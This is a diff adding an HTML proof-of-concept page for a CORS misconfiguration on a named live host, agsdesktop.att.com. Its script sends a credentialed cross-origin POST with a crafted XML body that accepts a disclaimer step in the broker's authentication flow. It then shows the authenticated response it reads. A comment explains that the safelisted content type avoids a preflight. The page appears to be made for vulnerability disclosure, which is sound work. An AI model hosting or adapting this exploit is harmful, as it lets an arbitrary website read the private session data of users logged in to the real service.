@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CORS PoC - agsdesktop.att.com</title>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 2rem; max-width: 60rem; }
+    pre  { background:#111; color:#0f0; padding:1rem; overflow:auto; white-space:pre-wrap; }
+    .bad { color:#c00; font-weight:bold; }
+  </style>
+</head>
+<body>
+  <h1>CORS misconfiguration proof of concept</h1>
+  <p>Target: <code>https://agsdesktop.att.com/broker/xml</code></p>
+  <p>Origin of this page: <code id="origin"></code></p>
+  <p>
+    This page performs a cross-origin <code>POST</code> with
+    <code>credentials: 'include'</code>. If the response body is displayed below, an
+    arbitrary website has read an authenticated response from the target.
+  </p>
+  <pre id="out">running...</pre>
+
+<script>
+document.getElementById('origin').textContent = window.location.origin;
+
+// Content-Type is CORS-safelisted, so this is a "simple request" - no preflight.
+fetch('https://agsdesktop.att.com/broker/xml', {
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
+  body: "<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'>"
+      + "<do-submit-authentication><screen><name>disclaimer</name><params><param>"
+      + "<name>accept</name><values><value>true</value></values>"
+      + "</param></params></screen></do-submit-authentication></broker>"
+})
+.then(function (r) { return r.text(); })
+.then(function (t) {
+  document.getElementById('out').innerHTML =
+    '<span class="bad">RESPONSE READ CROSS-ORIGIN:</span>\n\n'
+    + t.replace(/</g, '&lt;');
+})
+.catch(function (e) {
+  document.getElementById('out').textContent = 'Blocked by browser: ' + e;
+});
+</script>
+</body>
+</html>
